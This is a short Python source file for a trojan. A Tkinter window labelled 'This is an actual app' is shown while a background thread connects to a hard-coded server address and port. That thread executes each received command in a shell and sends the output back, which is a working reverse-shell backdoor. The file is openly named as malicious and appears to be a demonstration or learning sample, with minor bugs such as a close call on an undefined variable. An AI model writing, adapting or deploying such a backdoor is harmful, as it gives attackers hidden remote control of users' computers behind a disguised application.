#import modules
import os
import subprocess
import socket
    # Import the library
from tkinter import *
from tkinter import filedialog

import threading
import subprocess


# define constants
SERVER_IP = "192.168.3.144"
SERVER_PORT = 5678;


def main():
    # create and maintain socket
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as backdoor:
    
        # connect with server
        backdoor.connect((SERVER_IP,SERVER_PORT));
        
        # continuously accept commands from server
        while True:
            
            # receive command
            command = backdoor.recv(1024).decode('utf-8');
            
            # terminate
            if(command == "exit -t"):
                break;
            
            # execute command from server
            op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
            output = op.stdout.read()
            
            # get error if any
            output_error = op.stderr.read()
            
            
            # if output  or error send output only
            if(output or output_error):
                backdoor.send(output + output_error)
                
            # if sent command has no response 
            else:
                backdoor.send("Complete".encode('utf-8'))
            
        # close connection
        s.close();


# define kivy UI
def run_ui():

    # Create an instance of window
    app =Tk()

    # Set the geometry of the window
    app.geometry("700x400")
    
    app.config(bg='#4fe3a5');


    # Create a label widget
    Label(app, bg='#4fe3a5',text="This is an actual app", font=('Helvetica 25 bold')).place(relx=0.5, rely=0.5, anchor=CENTER)

    app.mainloop()


# run backdoor on a thread
mal_thread = threading.Thread(target=main)
mal_thread.start()

run_ui()

